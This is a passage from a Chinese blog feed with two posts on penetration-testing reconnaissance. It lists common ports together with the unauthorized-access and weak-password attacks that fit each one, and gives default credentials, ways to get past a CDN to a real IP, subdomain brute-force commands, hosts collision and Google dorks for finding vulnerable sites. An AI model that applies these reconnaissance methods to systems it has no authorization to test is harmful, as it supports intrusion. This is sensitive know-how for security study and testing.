class="hljs-number">8083</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">8089</span>,<span class="hljs-number">9090</span>,<span class="hljs-number">7778</span>,<span class="hljs-number">7001</span>,<span class="hljs-number">7002</span>,<span class="hljs-number">6082</span>,<span class="hljs-number">5984</span>,<span class="hljs-number">4440</span>,<span class="hljs-number">3312</span>,<span class="hljs-number">3311</span>,<span class="hljs-number">3128</span>,<span class="hljs-number">2601</span>,<span class="hljs-number">2604</span>,<span class="hljs-number">2222</span>,<span class="hljs-number">2082</span>,<span class="hljs-number">2083</span>,<span class="hljs-number">389</span>,<span class="hljs-number">88</span>,<span class="hljs-number">512</span>,<span class="hljs-number">513</span>,<span class="hljs-number">514</span>,<span class="hljs-number">1025</span>,<span class="hljs-number">111</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">445</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">53</span><br></code></pre></div></td></tr></table></figure><h2 id="渗透常见端口及对应服务"><a href="#渗透常见端口及对应服务" class="headerlink" title="渗透常见端口及对应服务"></a><strong>渗透常见端口及对应服务</strong></h2><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-number">1.</span><span class="hljs-string">web类(web漏洞/敏感目录)</span><br><br><span class="hljs-string">第三方通用组件漏洞struts</span> <span class="hljs-string">thinkphp</span> <span class="hljs-string">jboss</span> <span class="hljs-string">ganglia</span> <span class="hljs-string">zabbix</span><br><br><span class="hljs-number">80</span> <span class="hljs-string">web</span><br><br><span class="hljs-number">80</span><span class="hljs-number">-89</span> <span class="hljs-string">web</span><br><br><span class="hljs-number">8000</span><span class="hljs-number">-9090</span> <span class="hljs-string">web</span><br><br><span class="hljs-number">2</span><span class="hljs-string">.数据库类(扫描弱口令)</span><br><br><span class="hljs-number">1433 </span><span class="hljs-string">MSSQL</span><br><br><span class="hljs-number">1521 </span><span class="hljs-string">Oracle</span><br><br><span class="hljs-number">3306 </span><span class="hljs-string">MySQL</span><br><br><span class="hljs-number">5432 </span><span class="hljs-string">PostgreSQL</span><br><br><span class="hljs-number">3</span><span class="hljs-string">.特殊服务类(未授权/命令执行类/漏洞)</span><br><br><span class="hljs-number">443</span> <span class="hljs-string">SSL心脏滴血</span><br><br><span class="hljs-number">873</span> <span class="hljs-string">Rsync未授权</span><br><br><span class="hljs-number">5984 </span><span class="hljs-string">CouchDB</span> <span class="hljs-string">http://xxx:5984/_utils/</span><br><br><span class="hljs-number">6379 </span><span class="hljs-string">redis未授权</span><br><br><span class="hljs-number">7001</span><span class="hljs-string">,7002</span> <span class="hljs-string">WebLogic默认弱口令，反序列</span><br><br><span class="hljs-number">9200</span><span class="hljs-string">,9300</span> <span class="hljs-string">elasticsearch</span> <span class="hljs-string">参考WooYun:</span> <span class="hljs-string">多玩某服务器ElasticSearch命令执行漏洞</span><br><br><span class="hljs-number">11211</span> <span class="hljs-string">memcache未授权访问</span><br><br><span class="hljs-number">27017</span><span class="hljs-string">,27018</span> <span class="hljs-string">Mongodb未授权访问</span><br><br><span class="hljs-number">50000</span> <span class="hljs-string">SAP命令执行</span><br><br><span class="hljs-number">50070</span><span class="hljs-string">,50030</span> <span class="hljs-string">hadoop默认端口未授权访问</span><br><br><span class="hljs-number">4</span><span class="hljs-string">.常用端口类(扫描弱口令/端口爆破)</span><br><br><span class="hljs-number">21</span> <span class="hljs-string">ftp</span><br><br><span class="hljs-number">22</span> <span class="hljs-string">SSH</span><br><br><span class="hljs-number">23</span> <span class="hljs-string">Telnet</span><br><br><span class="hljs-number">2601</span><span class="hljs-string">,2604</span> <span class="hljs-string">zebra路由，默认密码zebra</span><br><br><span class="hljs-number">3389</span> <span class="hljs-string">远程桌面</span><br><br><span class="hljs-number">5</span><span class="hljs-string">.端口合计详情</span><br><br><span class="hljs-number">21</span> <span class="hljs-string">ftp</span><br><br><span class="hljs-number">22</span> <span class="hljs-string">SSH</span><br><br><span class="hljs-number">23</span> <span class="hljs-string">Telnet</span><br><br><span class="hljs-number">80</span> <span class="hljs-string">web</span><br><br><span class="hljs-number">80</span><span class="hljs-number">-89</span> <span class="hljs-string">web</span><br><br><span class="hljs-number">161</span> <span class="hljs-string">SNMP</span><br><br><span class="hljs-number">389</span> <span class="hljs-string">LDAP</span><br><br><span class="hljs-number">443</span> <span class="hljs-string">SSL心脏滴血以及一些web漏洞测试</span><br><br><span class="hljs-number">445</span> <span class="hljs-string">SMB</span><br><br><span class="hljs-number">512</span><span class="hljs-string">,513,514</span> <span class="hljs-string">Rexec</span><br><br><span class="hljs-number">873</span> <span class="hljs-string">Rsync未授权</span><br><br><span class="hljs-number">1025</span><span class="hljs-string">,111</span> <span class="hljs-string">NFS</span><br><br><span class="hljs-number">1433 </span><span class="hljs-string">MSSQL</span><br><br><span class="hljs-number">1521 </span><span class="hljs-string">Oracle:(iSqlPlus</span> <span class="hljs-string">Port:5560,7778)</span><br><br><span class="hljs-number">2082</span><span class="hljs-string">/2083</span> <span class="hljs-string">cpanel主机管理系统登陆</span> <span class="hljs-string">（国外用较多）</span><br><br><span class="hljs-number">2222 </span><span class="hljs-string">DA虚拟主机管理系统登陆</span> <span class="hljs-string">（国外用较多）</span><br><br><span class="hljs-number">2601</span><span class="hljs-string">,2604</span> <span class="hljs-string">zebra路由，默认密码zebra</span><br><br><span class="hljs-number">3128 </span><span class="hljs-string">squid代理默认端口，如果没设置口令很可能就直接漫游内网了</span><br><br><span class="hljs-number">3306 </span><span class="hljs-string">MySQL</span><br><br><span class="hljs-number">3312</span><span class="hljs-string">/3311</span> <span class="hljs-string">kangle主机管理系统登陆</span><br><br><span class="hljs-number">3389</span> <span class="hljs-string">远程桌面</span><br><br><span class="hljs-number">4440 </span><span class="hljs-string">rundeck</span> <span class="hljs-string">参考WooYun:</span> <span class="hljs-string">借用新浪某服务成功漫游新浪内网</span><br><br><span class="hljs-number">5432 </span><span class="hljs-string">PostgreSQL</span><br><br><span class="hljs-number">5900 </span><span class="hljs-string">vnc</span><br><br><span class="hljs-number">5984 </span><span class="hljs-string">CouchDB</span> <span class="hljs-string">http://xxx:5984/_utils/</span><br><br><span class="hljs-number">6082 </span><span class="hljs-string">varnish</span> <span class="hljs-string">参考WooYun:</span> <span class="hljs-string">Varnish</span> <span class="hljs-string">HTTP</span> <span class="hljs-string">accelerator</span> <span class="hljs-string">CLI</span> <span class="hljs-string">未授权访问易导致网站被直接篡改或者作为代理进入内网</span><br><br><span class="hljs-number">6379 </span><span class="hljs-string">redis未授权</span><br><br><span class="hljs-number">7001</span><span class="hljs-string">,7002</span> <span class="hljs-string">WebLogic默认弱口令，反序列</span><br><br><span class="hljs-number">7778 </span><span class="hljs-string">Kloxo主机控制面板登录</span><br><br><span class="hljs-number">8000</span><span class="hljs-number">-9090</span> <span class="hljs-string">都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上</span><br><br><span class="hljs-number">8080 </span><span class="hljs-string">tomcat/WDCP主机管理系统，默认弱口令</span><br><br><span class="hljs-number">8080</span><span class="hljs-string">,8089,9090</span> <span class="hljs-string">JBOSS</span><br><br><span class="hljs-number">8083 </span><span class="hljs-string">Vestacp主机管理系统</span> <span class="hljs-string">（国外用较多）</span><br><br><span class="hljs-number">8649 </span><span class="hljs-string">ganglia</span><br><br><span class="hljs-number">8888 </span><span class="hljs-string">amh/LuManager</span> <span class="hljs-string">主机管理系统默认端口</span><br><br><span class="hljs-number">9200</span><span class="hljs-string">,9300</span> <span class="hljs-string">elasticsearch</span> <span class="hljs-string">参考WooYun:</span> <span class="hljs-string">多玩某服务器ElasticSearch命令执行漏洞</span><br><br><span class="hljs-number">10000</span> <span class="hljs-string">Virtualmin/Webmin</span> <span class="hljs-string">服务器虚拟主机管理系统</span><br><br><span class="hljs-number">11211</span> <span class="hljs-string">memcache未授权访问</span><br><br><span class="hljs-number">27017</span><span class="hljs-string">,27018</span> <span class="hljs-string">Mongodb未授权访问</span><br><br><span class="hljs-number">28017</span> <span class="hljs-string">mongodb统计页面</span><br><br><span class="hljs-number">50000</span> <span class="hljs-string">SAP命令执行</span><br><br><span class="hljs-number">50070</span><span class="hljs-string">,50030</span> <span class="hljs-string">hadoop默认端口未授权访问</span><br></code></pre></div></td></tr></table></figure><h2 id="常见的端口和攻击方法"><a href="#常见的端口和攻击方法" class="headerlink" title="常见的端口和攻击方法"></a><strong>常见的端口和攻击方法</strong></h2><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240617233531687.png" alt="image-20240617233531687"></p><hr><h4 id="查找真实ip-1"><a href="#查找真实ip-1" class="headerlink" title="查找真实ip"></a>查找真实ip</h4><p>如果目标网站使用了CDN，使用了cdn真实的ip会被隐藏，如果要查找真实的服务器就必须获取真实的ip，根据这个ip继续查询旁站。</p><p>注意：很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实ip也是一种途径。</p><p><strong>多地ping确认是否使用CDN</strong></p><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p><p><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%BA%8C%EF%BC%89/image-20240618103735588.png" alt="image-20240618103735588"></p><p>** 查询历史DNS解析记录**<br>在查询到的历史解析记录中，最早的历史解析ip很有可能记录的就是真实ip，快速查找真实IP推荐此方法，但并不是所有网站都能查到。</p><p><strong>DNSDB</strong><br><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a><br><strong>微步在线</strong><br><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></p><p><strong>Ipip.net</strong><br><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p><p><strong>viewdns</strong><br><a href="https://viewdns.info/">https://viewdns.info</a></p><p><strong>phpinfo</strong><br>如果目标网站存在phpinfo泄露等，可以在phpinfo中的SERVER_ADDR或_SERVER[“SERVER_ADDR”]找到真实ip</p><p><strong>绕过CDN</strong><br>绕过CDN的多种方法具体可以参考 <a href="https://www.cnblogs.com/qiudabai/p/9763739.html">https://www.cnblogs.com/qiudabai/p/9763739.html</a></p><hr>]]></content>
    
    
    <categories>
      
      <category>渗透基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透之信息收集（一）</title>
    <link href="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h1><p>渗透的本质是信息收集，在一个渗透项目当中，信息搜集是一个非常重要的环节，搜集足够多的信息，测试足够多的信息，才有足够多的可能。</p><p><strong>搜集信息主要包括但不限于域名信息，子域名信息，网站信息，网站根目录敏感文件，网站真实ip，ip暴露端口，中间件信息等等….</strong></p><hr><h1 id="Web信息搜集"><a href="#Web信息搜集" class="headerlink" title="Web信息搜集"></a>Web信息搜集</h1><h2 id="前期探测"><a href="#前期探测" class="headerlink" title="前期探测"></a>前期探测</h2><p><strong>1、域名信息</strong><br><strong>2、对应ip收集</strong><br>相关域名对应ip，相关工具：</p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">nslookup</span><br><br>ip138……<br></code></pre></div></td></tr></table></figure><p>查找目标域名信息的方法</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">fofa title=“公司名称”<br><br>百度搜索 <span class="hljs-built_in">int</span>itle=公司名称<br><br>Google搜索 <span class="hljs-built_in">int</span>itle=公司名称<br><br>站长之家直接搜索名称或者网站域名即可查看相关信息：http:<span class="hljs-comment">//tool.chinaz.com</span><br><br>钟馗之眼 site=域名即可 https:<span class="hljs-comment">//www.zoomeye.org/</span><br></code></pre></div></td></tr></table></figure><p><strong>3、子域名收集</strong></p><p>收集的子域名可以扩大测试的范围，统一域名下的二级域名都属于目标范围</p><p><strong>子域名在线查询</strong><br><a href="https://www.t1h2ua.cn/tools/">https://www.t1h2ua.cn/tools/</a>**</p><p><strong>工具：layer、subDomainsBrute</strong></p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/image-20240617233109222.png" alt="image-20240617233109222"></p><p><strong>子域名在线查询1</strong><br><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/image-20240617233022961.png" alt="image-20240617233022961"></p><p><strong>dns侦测</strong><br><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a><br><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/image-20240617233040795.png" alt="image-20240617233040795"></p><p><strong>IP138查询子域名</strong><br><a href="https://site.ip138.com/baidu.com/domain.htm">https://site.ip138.com/baidu.com/domain.htm</a></p><p><strong>FOFA搜索子域名</strong><br><a href="https://fofa.so/">https://fofa.so/</a></p><p>语法：domain&#x3D;“baidu.com”</p><p><strong>Hackertarget查询子域名</strong><br><a href="https://hackertarget.com/find-dns-host-records/">https://hackertarget.com/find-dns-host-records/</a></p><p>注意：通过该方法查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。</p><p><strong>360测绘空间</strong><br><a href="https://quake.360.cn/">https://quake.360.cn/</a></p><p>domain:”*.freebuf.com”</p><p><strong>SubDomainBrute</strong><br>pip install aiodns</p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/image-20240617233140676.png" alt="image-20240617233140676"></p><p>运行命令subDomainsBrute.py freebuf.com</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">subDomainsBrute<span class="hljs-selector-class">.py</span> freebuf<span class="hljs-selector-class">.com</span> <span class="hljs-attr">--full</span> -o freebuf2.txt<br></code></pre></div></td></tr></table></figure><p><strong>Sublist3r</strong><br><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></p><p>pip install -r requirements.txt</p><p>提示：以上方法为爆破子域名，由于字典比较强大，所以效率较高。</p><p>帮助文档</p><figure class="highlight diff"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs diff"><span class="hljs-deletion">-h ：帮助</span><br><br><span class="hljs-deletion">-d ：指定主域名枚举子域名</span><br><br><span class="hljs-deletion">-b ：调用subbrute暴力枚举子域名</span><br><br><span class="hljs-deletion">-p ：指定tpc端口扫描子域名</span><br><br><span class="hljs-deletion">-v ：显示实时详细信息结果</span><br><br><span class="hljs-deletion">-t ：指定线程</span><br><br><span class="hljs-deletion">-e ：指定搜索引擎</span><br><br><span class="hljs-deletion">-o ：将结果保存到文本</span><br><br><span class="hljs-deletion">-n ：输出不带颜色</span><br><br>默认参数扫描子域名<br><br>python sublist3r.py -d baidu.com<br><br>使用暴力枚举子域名<br><br>python sublist3r -b -d baidu.com<br></code></pre></div></td></tr></table></figure><p><strong>OneForALL</strong><br>pip3 install –user -r requirements.txt -i <a href="https://mirrors.aliyun.com/pypi/simple/">https://mirrors.aliyun.com/pypi/simple/</a></p><p>python3 oneforall.py –target baidu.com run &#x2F;<em>收集</em>&#x2F;</p><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/image-20240617233234071.png" alt="image-20240617233234071"></p><p><strong>爆破子域名</strong></p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">brute<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--target</span> domain<span class="hljs-selector-class">.com</span> <span class="hljs-attr">--word</span> True run<br><br>brute<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--targets</span> ./domains<span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--word</span> True run<br><br>brute<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--target</span> domain<span class="hljs-selector-class">.com</span> <span class="hljs-attr">--word</span> True <span class="hljs-attr">--concurrent</span> <span class="hljs-number">2000</span> run<br><br>brute<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--target</span> domain<span class="hljs-selector-class">.com</span> <span class="hljs-attr">--word</span> True <span class="hljs-attr">--wordlist</span> subnames<span class="hljs-selector-class">.txt</span> run<br><br>brute<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--target</span> domain<span class="hljs-selector-class">.com</span> <span class="hljs-attr">--word</span> True <span class="hljs-attr">--recursive</span> True <span class="hljs-attr">--depth</span> <span class="hljs-number">2</span> run<br><br>brute<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--target</span> d<span class="hljs-selector-class">.com</span> <span class="hljs-attr">--fuzz</span> True <span class="hljs-attr">--place</span> m.*<span class="hljs-selector-class">.d</span><span class="hljs-selector-class">.com</span> <span class="hljs-attr">--rule</span> <span class="hljs-string">&#x27;[a-z]&#x27;</span> run<br><br>brute<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--target</span> d<span class="hljs-selector-class">.com</span> <span class="hljs-attr">--fuzz</span> True <span class="hljs-attr">--place</span> m.*<span class="hljs-selector-class">.d</span><span class="hljs-selector-class">.com</span> <span class="hljs-attr">--fuzzlist</span> subnames<span class="hljs-selector-class">.txt</span> run<br></code></pre></div></td></tr></table></figure><p><img src="/2024/06/16/%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/image-20240617233250532.png" alt="image-20240617233250532"></p><p><strong>隐藏域名hosts碰撞</strong><br>隐藏资产探测-hosts碰撞</p><p><a href="https://mp.weixin.qq.com/s/fuASZODw1rLvgT7GySMC8Q">https://mp.weixin.qq.com/s/fuASZODw1rLvgT7GySMC8Q</a></p><p>很多时候访问目标资产IP响应多为：401、403、404、500，但是用域名请求却能返回正常的业务系统（禁止IP直接访问），因为这大多数都是需要绑定host才能正常请求访问的 （目前互联网公司基本的做法）（域名删除了A记录，但是反代的配置未更新），那么我们就可以通过收集到的目标的 域名 和 目标资产 的IP段组合起来，以 IP段+域名 的形式进行捆绑碰撞，就能发现很多有意思的东西。</p><p>在发送http请求的时候，对域名和IP列表进行配对，然后遍历发送请求 （就相当于修改了本地的hosts文件一样），并把相应的title和响应包大小拿回 来做对比，即可快速发现一些隐蔽的资产。</p><p>进行hosts碰撞需要目标的域名和目标的相关IP作为字典</p><p>域名就不说了</p><p>相关IP来源有：</p><p>目标域名历史解析IP</p><p><a href="https://site.ip138.com/">https://site.ip138.com/</a></p><p><a href="https://ipchaxun.com/">https://ipchaxun.com/</a></p><p>ip正则</p><p><a href="https://www.aicesu.cn/reg/">https://www.aicesu.cn/reg/</a></p><p><strong>4、Whois信息查询</strong><br>根据已知域名反查，分析出此域名的注册人、邮箱、电话等</p><p>工具：爱站网、站长工具、微步在线（<a href="https://x.threatbook.cn）、site.ip138.com、searchdns.netcraft.com、国外whois信息查询网址：https://who.is旁站c段">https://x.threatbook.cn）、site.ip138.com、searchdns.netcraft.com、国外whois信息查询网址：https://who.is旁站c段</a><br><strong>5、旁站</strong><br>一个服务器上有多个网站 通过ip查询服务器上的网站</p><p>C段<br>查找同一个ip段服务器上的网站，可以找到同样同站的类型和服务器，也可以获取同段服务器进行下一步渗透</p><p>收集方向<br>域名、端口、目录</p><p><strong>常用工具</strong></p><p>Webè<a href="http://www.5kik.com/c/%E3%80%81%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7">http://www.5kik.com/c/、目录扫描工具</a></p><hr><h4 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h4><p>通过扫描目录和文件，大致了解同站的的结构，获取突破点，比如后台，文件备份，上传点<br><strong>收集方向</strong><br>Robots.txt、后台目录、安装包、上传目录、mysql管理接口、安装页面、phpinfo、编辑器、iis短文件、分析网站cms</p><p><strong>常用工具</strong><br>字典爆破：御剑、dirbuster、wwwscan、iis_shortname_scanner等</p><p>菜刀、webrobot、burp等</p><hr><h4 id="端口分析"><a href="#端口分析" class="headerlink" title="端口分析"></a>端口分析</h4><p>服务器需要开放服务，就必须开启端口，常见的端口是tcp和udp两种类型范围0-65535通过扫描得到的端口访问服务，规划下一步渗透</p><hr><h2 id="整站分析"><a href="#整站分析" class="headerlink" title="整站分析"></a>整站分析</h2><h3 id="1、服务器类型"><a href="#1、服务器类型" class="headerlink" title="1、服务器类型"></a><strong>1、服务器类型</strong></h3><p>服务器平台、版本等</p><h3 id="2、网站容器"><a href="#2、网站容器" class="headerlink" title="2、网站容器"></a><strong>2、网站容器</strong></h3><p>搭建网站等服务组件，例如：iis、apache、nginx、tomact等</p><h3 id="3、脚本类型"><a href="#3、脚本类型" class="headerlink" title="3、脚本类型"></a><strong>3、脚本类型</strong></h3><p>Asp、php、jsp、aspx等</p><h3 id="4、数据库类型"><a href="#4、数据库类型" class="headerlink" title="4、数据库类型"></a><strong>4、数据库类型</strong></h3><figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada"><span class="hljs-keyword">Access</span>、sqlserver、mysql、oracle、postgresql等<br><br>Asp+<span class="hljs-keyword">access</span>/sqlserver<br><br>Aspx+sqlserver/<span class="hljs-keyword">access</span><br><br>Php+mysql<br><br>Php+postgresql<br><br>Php+oracle<br><br>Jsp+sqlserver/mysql/oracle<br><br>Linux jsp+mysql<br><br>Windows jsp+sqlserver<br></code></pre></div></td></tr></table></figure><h3 id="4、CMS类型"><a href="#4、CMS类型" class="headerlink" title="4、CMS类型"></a><strong>4、CMS类型</strong></h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">Robots文件<br><br><span class="hljs-regexp">/plugs/</span> 之梦<br><br>登陆后台泄露cms类型<br><br>网站页脚泄露的cms<br><br>工具自动化识别cms类型<br><br>对应的cms漏洞直接利用<br><br>下载对应的cms分析目录<br><br>审计该cms源码漏洞<br><br>WAF<br></code></pre></div></td></tr></table></figure><h3 id="谷歌hacker"><a href="#谷歌hacker" class="headerlink" title="谷歌hacker"></a>谷歌hacker</h3><p><strong>Intext：</strong><br>查找网页中含有xx关键字的网站 例：intext：管理员登陆</p><p><strong>Intitle：</strong><br>查找某个标题 例：intitle：后台登陆</p><p><strong>Filetype：</strong><br>查找某个文件类型的文件 例：数据挖掘filetype：doc</p><p><strong>Inurl：</strong><br>查找url中带有某字段的网站 例：inurl：php？id&#x3D;</p><p><strong>Site：</strong><br>中某域名中查找信息</p><p>….</p><hr><h3 id="url采集"><a href="#url采集" class="headerlink" title="url采集"></a>url采集</h3><p><strong>采集相关url的同类网站</strong><br>例如:<br>Php？id&#x3D;<br><strong>漏洞网站</strong><br>相同某种指纹网站<br><strong>常用工具</strong><br>谷歌hacker<br>url采集器</p><h3 id="信息分析"><a href="#信息分析" class="headerlink" title="信息分析"></a>信息分析</h3><p><strong>服务信息收集</strong></p><p>网络服务：web&#x2F;ftp&#x2F;telnet&#x2F;ssh&#x2F;mail&#x2F;mysql&#x2F;mssql&#x2F;oracle&#x2F;rdp<br>服务版本，漏洞等相关信息收集<br>系统版本信息收集</p><hr><h3 id="网络设备信息收集"><a href="#网络设备信息收集" class="headerlink" 